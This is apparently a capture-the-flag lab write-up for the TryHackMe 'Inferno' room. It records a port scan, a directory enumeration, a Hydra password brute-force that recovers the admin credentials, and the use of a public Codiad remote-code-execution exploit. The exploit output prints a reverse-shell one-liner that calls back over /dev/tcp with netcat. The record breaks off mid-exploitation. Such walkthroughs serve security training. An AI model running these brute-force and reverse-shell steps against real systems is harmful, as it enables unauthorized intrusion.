# Inferno — Writeup

## Overview
### Inferno — Writeup
### Inferno — Writeup
----
eal Life machine + CTF. The machine is designed to be real-life (maybe not?) and is perfect for newbies starting out in penetration testing
----
![222](https://tryhackme-images.s3.amazonaws.com/room-icons/04838068cabd2452b322e06418cce864.png)
Start Machine
﻿"Midway upon the journey of our life I found myself within a forest dark, For the straightforward pathway had been lost. Ah me! how hard a thing it is to say What was this forest savage, rough, and stern, Which in the very thought renews the fear."
There are 2 hash keys located on the machine (user - local.txt and root - proof.txt), can you find them and become root?
**Remember: in the nine circles of Hell you will find some demons that will try to prevent your access, ignore them and move on. (****if you can****)**
Answer the questions below

## Enumeration
```text
──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.162.52 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.162.52:21
Open 10.10.162.52:22
Open 10.10.162.52:23
Open 10.10.162.52:25
Open 10.10.162.52:80
Open 10.10.162.52:88
Open 10.10.162.52:106
Open 10.10.162.52:110
Open 10.10.162.52:194
Open 10.10.162.52:389
Open 10.10.162.52:443
Open 10.10.162.52:464
Open 10.10.162.52:636
Open 10.10.162.52:750
Open 10.10.162.52:775
Open 10.10.162.52:777
Open 10.10.162.52:779
Open 10.10.162.52:783
Open 10.10.162.52:808
Open 10.10.162.52:873
Open 10.10.162.52:1178

┌──(witty㉿kali)-[~/Downloads]
└─$ ftp 10.10.162.52
Connected to 10.10.162.52.
^C
421 Service not available, user interrupt. Connection closed.
ftp> exit

Oh quanto parve a me gran maraviglia
quand'io vidi tre facce a la sua testa!
L'una dinanzi, e quella era vermiglia;

l'altr'eran due, che s'aggiugnieno a questa
sovresso 'l mezzo di ciascuna spalla,
e se' giugnieno al loco de la cresta 

┌──(witty㉿kali)-[~/Downloads]
└─$ gobuster -t 64 dir -e -k -u http://10.10.162.52/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.162.52/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://10.10.162.52/inferno              (Status: 401) [Size: 459]

┌──(witty㉿kali)-[~/Downloads]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.162.52 http-get /inferno -t 64 
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking http-get://10.10.162.52:80/inferno
[STATUS] 6400.00 tries/min, 6400 tries in 00:01h, 14337999 to do in 37:21h, 64 active
[80][http-get] host: 10.10.162.52   login: admin   password: dante1
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished

login 2 times (codiad)

https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit

┌──(witty㉿kali)-[~/Downloads]
└─$ git clone https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit.git
Cloning into 'Codiad-Remote-Code-Execute-Exploit'...
remote: Enumerating objects: 133, done.
remote: Total 133 (delta 0), reused 0 (delta 0), pack-reused 133
Receiving objects: 100% (133/133), 2.15 MiB | 1.52 MiB/s, done.
Resolving deltas: 100% (56/56), done.
                                                                                                           
┌──(witty㉿kali)-[~/Downloads]
└─$ cd Codiad-Remote-Code-Execute-Exploit 
                                                                                                           
┌──(witty㉿kali)-[~/Downloads/Codiad-Remote-Code-Execute-Exploit]
└─$ ls
exploit.py  img  README.md
                                                                                                           
┌──(witty㉿kali)-[~/Downloads/Codiad-Remote-Code-Execute-Exploit]
└─$ python exploit.py          
  File "/home/witty/Downloads/Codiad-Remote-Code-Execute-Exploit/exploit.py", line 22
    print "[+] Login Content : %s" % (content)
    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
SyntaxError: Missing parentheses in call to 'print'. Did you mean print(...)?
                                                                                                           
┌──(witty㉿kali)-[~/Downloads/Codiad-Remote-Code-Execute-Exploit]
└─$ python2 exploit.py
Usage : 
        python exploit.py [URL] [USERNAME] [PASSWORD] [IP] [PORT] [PLATFORM]
        python exploit.py [URL:PORT] [USERNAME] [PASSWORD] [IP] [PORT] [PLATFORM]
Example : 
        python exploit.py http://localhost/ admin admin 8.8.8.8 8888 linux
        python exploit.py http://localhost:8080/ admin admin 8.8.8.8 8888 windows
Author : 
        WangYihang <wangyihanger@gmail.com>

┌──(witty㉿kali)-[~/Downloads/Codiad-Remote-Code-Execute-Exploit]
└─$ python2 exploit.py http://admin:dante1@10.10.162.52/inferno/ 'admin' 'dante1' 10.8.19.103 4444 linux
[+] Please execute the following command on your vps: 
echo 'bash -c "bash -i >/dev/tcp/10.8.19.103/4445 0>&1 2>&1"' | nc -lnvp 4444
nc -lnvp 4445
[+] Please confirm that you have done the two command above [y/n]
[Y/n] Y
[+] Starting...
[+] Login Content : {"status":"success","data":{"username":"admin"}}
[+] Login success!
[+] Getting writeable path...
